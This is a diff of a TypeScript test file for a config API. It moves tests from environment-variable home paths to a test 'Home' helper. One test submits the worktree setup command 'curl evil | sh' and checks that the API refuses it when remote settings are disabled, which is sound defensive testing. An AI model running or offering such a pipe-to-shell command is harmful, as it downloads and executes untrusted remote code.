@@ -1,3 +1,6 @@
+import { Home } from '../home/home.ts';
+import { useTestHome } from '../home/test-home.testkit.ts';
+import { testHome } from '../home/test-home.testkit.ts';
 import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
@@ -33,7 +36,7 @@ describe('the config API', () => {
     repoRoot = mkdtempSync(join(tmpdir(), 'cez-configapi-'));
     homeRoot = mkdtempSync(join(tmpdir(), 'cez-configapi-home-'));
     process.env.HOME = homeRoot;
-    process.env.CEZ_HOME = join(homeRoot, 'cezar-sandbox');
+    useTestHome(join(homeRoot, 'cezar-sandbox') ? Home.sandbox(join(homeRoot, 'cezar-sandbox')) : undefined);
     process.env.CODEX_HOME = join(homeRoot, '.codex');
     process.env.XDG_CONFIG_HOME = join(homeRoot, '.config');
     delete process.env.CEZ_AGENT_MODELS_LOCKED;
@@ -41,7 +44,7 @@ describe('the config API', () => {
     mkdirSync(join(homeRoot, 'cezar-sandbox'), { recursive: true });
     store = RunStore.open(join(repoRoot, '.ai/cezar'));
     // The config routes never touch the manager — an empty stub is honest.
-    app = createApp({ repoRoot, store, manager: {} as RunManager, version: '0.0.0-test', cezarPort: () => 4321 });
+    app = createApp({ home: testHome(), repoRoot, store, manager: {} as RunManager, version: '0.0.0-test', cezarPort: () => 4321 });
   });
 
   afterEach(() => {
@@ -50,8 +53,8 @@ describe('the config API', () => {
     rmSync(homeRoot, { recursive: true, force: true });
     if (savedHome === undefined) delete process.env.HOME;
     else process.env.HOME = savedHome;
-    if (savedCezHome === undefined) delete process.env.CEZ_HOME;
-    else process.env.CEZ_HOME = savedCezHome;
+    if (savedCezHome === undefined) useTestHome(undefined);
+    else useTestHome(savedCezHome ? Home.sandbox(savedCezHome) : undefined);
     if (savedCodexHome === undefined) delete process.env.CODEX_HOME;
     else process.env.CODEX_HOME = savedCodexHome;
     if (savedXdgConfigHome === undefined) delete process.env.XDG_CONFIG_HOME;
@@ -341,16 +344,16 @@ describe('the config API', () => {
     const savedRemote = process.env.CEZ_REMOTE;
     process.env.CEZ_REMOTE = '1';
     try {
-      await enableRemoteSettings(4321);
+      await enableRemoteSettings(4321, undefined, undefined, testHome());
       const allowed = await put({ worktreeSetup: { commands: ['npm ci'] } });
       expect(allowed.status).toBe(200);
       expect(rawFile().worktreeSetup).toEqual({ commands: ['npm ci'] });
-      await disableRemoteSettings();
+      await disableRemoteSettings(undefined, undefined, testHome());
       const refused = await put({ worktreeSetup: { commands: ['curl evil | sh'] } });
       expect(refused.status).toBe(409);
       expect(rawFile().worktreeSetup).toEqual({ commands: ['npm ci'] });
     } finally {
-      await disableRemoteSettings();
+      await disableRemoteSettings(undefined, undefined, testHome());
       if (savedRemote === undefined) delete process.env.CEZ_REMOTE;
       else process.env.CEZ_REMOTE = savedRemote;
     }
@@ -366,7 +369,7 @@ describe('liveTitleUpdates round-trip (task auto-naming spec)', () => {
     repoRoot = mkdtempSync(join(tmpdir(), 'cez-configapi-title-'));
     mkdirSync(join(repoRoot, '.ai/cezar'), { recursive: true });
     store = RunStore.open(join(repoRoot, '.ai/cezar'));
-    app = createApp({ repoRoot, store, manager: {} as RunManager, version: '0.0.0-test' });
+    app = createApp({ home: testHome(), repoRoot, store, manager: {} as RunManager, version: '0.0.0-test' });
   });
 
   afterEach(() => {
@@ -403,7 +406,7 @@ describe('reviewGate round-trip (optional review gate, #489)', () => {
     repoRoot = mkdtempSync(join(tmpdir(), 'cez-configapi-gate-'));
     mkdirSync(join(repoRoot, '.ai/cezar'), { recursive: true });
     store = RunStore.open(join(repoRoot, '.ai/cezar'));
-    app = createApp({ repoRoot, store, manager: {} as RunManager, version: '0.0.0-test' });
+    app = createApp({ home: testHome(), repoRoot, store, manager: {} as RunManager, version: '0.0.0-test' });
   });
 
   afterEach(() => {
